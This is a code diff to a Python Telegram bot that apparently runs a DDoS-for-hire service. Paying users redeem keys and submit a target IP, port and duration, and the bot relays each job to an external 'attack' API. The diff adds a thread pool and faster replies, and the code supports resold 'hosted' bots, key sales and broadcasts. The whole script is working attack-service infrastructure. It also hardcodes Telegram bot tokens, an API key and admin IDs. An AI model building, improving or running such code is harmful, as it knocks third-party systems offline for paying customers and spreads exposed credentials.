@@ -13,6 +13,10 @@ from datetime import datetime, timedelta, timezone
 from collections import defaultdict
 from pymongo import MongoClient
 from pymongo.errors import ServerSelectionTimeoutError, ConnectionFailure
+from concurrent.futures import ThreadPoolExecutor
+
+# ========== THREAD POOL FOR FAST RESPONSES ==========
+executor = ThreadPoolExecutor(max_workers=10)
 
 # ========== TIMEZONE (IST) ==========
 IST = timezone(timedelta(hours=5, minutes=30))
@@ -28,7 +32,7 @@ def bold_msg(text):
     return f"<b>{text}</b>"
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8746526049:AAFqcTaEXrMm_MExU5xXTFLyJY_zaBYvxtc"
+BOT_TOKEN = "8604194287:AAFEhPxNzuHxWfw5yMkk60M_6CqU1kgAji4"
 ADMIN_ID = ["8487946379", "7495474613"]
 API_URL = "http://app.teamc2.xyz/api/attack"
 API_KEY = "W1SMH5"
@@ -200,7 +204,7 @@ def create_bot():
     max_retries = 3
     for attempt in range(max_retries):
         try:
-            bot = telebot.TeleBot(BOT_TOKEN, threaded=False, parse_mode='HTML')
+            bot = telebot.TeleBot(BOT_TOKEN, threaded=True, parse_mode='HTML')
             bot_info = bot.get_me()
             print(f"✅ Bot connected: @{bot_info.username}")
             return bot
@@ -356,7 +360,6 @@ def attack_cleanup():
         now = time.time()
         for attack_id, info in list(active_attacks.items()):
             if now >= info["finish_time"]:
-                # Send finish notification
                 try:
                     msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {info['target_key']}\n⏱️ Duration completed!\n💡 You can start new attack now.")
                     bot.send_message(info['user'], msg)
@@ -366,7 +369,6 @@ def attack_cleanup():
         for token, bot_info in hosted_bots.items():
             for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                 if now >= info["finish_time"]:
-                    # Send finish notification for hosted bot
                     try:
                         if token in hosted_bot_instances:
                             msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {info['target_key']}\n⏱️ Duration completed!\n💡 You can start new attack now.")
@@ -398,11 +400,10 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         bot_info = test_bot.get_me()
         print(f"✅ Hosted bot @{bot_info.username} is valid")
         
-        hosted_bot = telebot.TeleBot(bot_token, parse_mode='HTML')
+        hosted_bot = telebot.TeleBot(bot_token, threaded=True, parse_mode='HTML')
         hosted_bot_instances[bot_token] = hosted_bot
         hosted_cooldown_data = {}
         
-        # Get hosted bot specific settings
         bot_max_time = MAX_ATTACK_TIME
         if bot_token in hosted_bots:
             bot_max_time = hosted_bots[bot_token].get("max_attack_time", MAX_ATTACK_TIME)
@@ -411,8 +412,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         def hosted_start(msg):
             uid = str(msg.chat.id)
             current_time = format_ist_time(get_current_ist())
-            
-            # Check if user has access
             has_access = check_user_expiry(uid)
             
             if has_access:
@@ -496,7 +495,6 @@ Use /redeem KEY to get access
         def hosted_genkey(msg):
             uid = str(msg.chat.id)
             
-            # Check if user has access
             if not check_user_expiry(uid):
                 hosted_bot.reply_to(msg, bold_msg("❌ ACCESS DENIED!\n\nYou don't have an active key to generate keys!"))
                 return
@@ -525,8 +523,8 @@ Use /redeem KEY to get access
             save_keys(keys_data)
             expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
             
-            # Send key in code block for easy copy
-            hosted_bot.reply_to(msg, bold_msg(f"🔑 KEY: {key}\n\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}"))
+            # Key in code block for easy copy
+            hosted_bot.reply_to(msg, f"<b>🔑 KEY GENERATED:</b>\n\n<code>{key}</code>\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')
         
         @hosted_bot.message_handler(commands=['cooldown'])
         def hosted_cooldown(msg):
@@ -604,7 +602,7 @@ Use /redeem KEY to get access
                         mins = remaining // 60
                         secs = remaining % 60
                         time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-                        active_list.append(f"❌ SLOT {len(active_list)+1}: BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
+                        active_list.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
                 status_msg = f"📊 BOT STATUS\n📅 {current_time}\n\n"
                 for i in range(bot_info["concurrent"]):
                     if i < len(active_list):
@@ -713,7 +711,6 @@ Use /redeem KEY to get access
                 if now < ainfo["finish_time"]:
                     new_active += 1
             new_total = get_total_active_count()
-            current_time = format_ist_time(get_current_ist())
             finish_time_str = format_ist_time(get_current_ist() + timedelta(seconds=duration))
             
             content = bold_msg(f"🔥 ATTACK LAUNCHED 🔥\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Finish: {finish_time_str}\n📊 This Bot: {new_active}/{concurrent}\n🌐 Global: {new_total}/{MAX_CONCURRENT}")
@@ -731,7 +728,6 @@ Use /redeem KEY to get access
         def hosted_second(msg):
             uid = str(msg.chat.id)
             
-            # Only bot owner can change max time
             if uid != owner_id:
                 hosted_bot.reply_to(msg, bold_msg("❌ Only bot owner can change max time!"))
                 return
@@ -758,12 +754,12 @@ Use /redeem KEY to get access
         
         def run_hosted_bot():
             try:
-                hosted_bot.infinity_polling()
+                hosted_bot.infinity_polling(timeout=30, long_polling_timeout=30)
             except:
                 pass
         
         threading.Thread(target=run_hosted_bot, daemon=True).start()
-        time.sleep(3)
+        time.sleep(2)
         return True
         
     except Exception as e:
@@ -922,12 +918,15 @@ def host_bot_cmd(msg):
     }
     save_hosted_bots(hosted_bots)
     
-    if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
-        current_time = format_ist_time(get_current_ist())
-        content = bold_msg(f"✅ HOSTED BOT STARTED ✅\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n🌐 Global Limit: {MAX_CONCURRENT}\n📅 Started: {current_time}\n\n💡 Bot is now live!")
-        bot.reply_to(msg, content)
-    else:
-        bot.reply_to(msg, bold_msg("❌ HOSTED BOT FAILED!\n\nCheck token and try again."))
+    def start():
+        if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
+            current_time = format_ist_time(get_current_ist())
+            content = bold_msg(f"✅ HOSTED BOT STARTED ✅\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n🌐 Global Limit: {MAX_CONCURRENT}\n📅 Started: {current_time}\n\n💡 Bot is now live!")
+            bot.reply_to(msg, content)
+        else:
+            bot.reply_to(msg, bold_msg("❌ HOSTED BOT FAILED!\n\nCheck token and try again."))
+    
+    executor.submit(start)
 
 @bot.message_handler(commands=['unhost'], func=lambda msg: msg.chat.type == "private")
 def unhost_bot_cmd(msg):
@@ -1080,8 +1079,8 @@ def genkey(msg):
     save_keys(keys_data)
     expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
     
-    # Send key in code block for easy copy
-    bot.reply_to(msg, bold_msg(f"🔑 KEY: {key}\n\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}"))
+    # KEY IN CODE BLOCK FOR EASY COPY - FAST REPLY
+    bot.reply_to(msg, f"<b>🔑 KEY GENERATED:</b>\n\n<code>{key}</code>\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')
 
 @bot.message_handler(commands=['bulk'], func=lambda msg: msg.chat.type == "private")
 def bulk(msg):
@@ -1129,9 +1128,9 @@ def bulk(msg):
         keys.append(key)
     save_keys(keys_data)
     
-    keys_text = "\n".join([f"🔑 {k}" for k in keys])
+    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
     expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
-    bot.reply_to(msg, bold_msg(f"🔑 KEYS GENERATED:\n\n{keys_text}\n\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}"))
+    bot.reply_to(msg, f"<b>🔑 KEYS GENERATED:</b>\n\n{keys_text}\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')
 
 @bot.message_handler(commands=['removekey'], func=lambda msg: msg.chat.type == "private")
 def remove_key(msg):
@@ -1289,53 +1288,56 @@ def broadcast(msg):
     if user_id not in ADMIN_ID:
         return
     
-    if msg.reply_to_message:
-        success_count = 0
-        fail_count = 0
-        caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
-        
-        all_users = set()
-        for key, info in keys_data.items():
-            if info.get("used_by"):
-                all_users.add(info.get("used_by"))
-        
-        for user in all_users:
-            try:
-                if msg.reply_to_message.photo:
-                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
-                elif msg.reply_to_message.video:
-                    bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
-                else:
-                    bot.send_message(user, caption)
-                success_count += 1
-            except:
-                fail_count += 1
-        
-        bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
-    else:
-        args = msg.text.split(maxsplit=1)
-        if len(args) != 2:
-            bot.reply_to(msg, bold_msg("⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption"))
-            return
-        
-        message = args[1]
-        
-        all_users = set()
-        for key, info in keys_data.items():
-            if info.get("used_by"):
-                all_users.add(info.get("used_by"))
-        
-        success_count = 0
-        fail_count = 0
-        
-        for user in all_users:
-            try:
-                bot.send_message(user, bold_msg(f"📢 BROADCAST 📢\n\n{message}"))
-                success_count += 1
-            except:
-                fail_count += 1
-        
-        bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
+    def send_broadcast():
+        if msg.reply_to_message:
+            success_count = 0
+            fail_count = 0
+            caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
+            
+            all_users = set()
+            for key, info in keys_data.items():
+                if info.get("used_by"):
+                    all_users.add(info.get("used_by"))
+            
+            for user in all_users:
+                try:
+                    if msg.reply_to_message.photo:
+                        bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
+                    elif msg.reply_to_message.video:
+                        bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
+                    else:
+                        bot.send_message(user, caption)
+                    success_count += 1
+                except:
+                    fail_count += 1
+            
+            bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
+        else:
+            args = msg.text.split(maxsplit=1)
+            if len(args) != 2:
+                bot.reply_to(msg, bold_msg("⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption"))
+                return
+            
+            message = args[1]
+            
+            all_users = set()
+            for key, info in keys_data.items():
+                if info.get("used_by"):
+                    all_users.add(info.get("used_by"))
+            
+            success_count = 0
+            fail_count = 0
+            
+            for user in all_users:
+                try:
+                    bot.send_message(user, bold_msg(f"📢 BROADCAST 📢\n\n{message}"))
+                    success_count += 1
+                except:
+                    fail_count += 1
+            
+            bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
+    
+    executor.submit(send_broadcast)
 
 @bot.message_handler(commands=['stopattack'], func=lambda msg: msg.chat.type == "private")
 def stop_attack(msg):
@@ -1626,7 +1628,6 @@ def attack_group(msg):
     }
     
     new_total = get_total_active_count()
-    current_time = format_ist_time(get_current_ist())
     finish_time_str = format_ist_time(get_current_ist() + timedelta(seconds=duration))
     
     content = bold_msg(f"🔥 ATTACK LAUNCHED 🔥\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Finish: {finish_time_str}\n🌐 Active: {new_total}/{MAX_CONCURRENT}")
@@ -1636,7 +1637,6 @@ def attack_group(msg):
         send_attack_to_api(ip, port, duration, msg.chat.id, bot)
         time.sleep(duration)
         if attack_id in active_attacks:
-            # Send finish notification to user
             try:
                 finish_msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s completed!\n💡 You can start new attack now.")
                 bot.send_message(user_id, finish_msg)
@@ -1750,7 +1750,7 @@ print("=" * 50)
 
 while True:
     try:
-        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        bot.infinity_polling(timeout=30, long_polling_timeout=30)
     except Exception as e:
         print(f"Bot polling error: {e}")
-        time.sleep(10)
+        time.sleep(5)
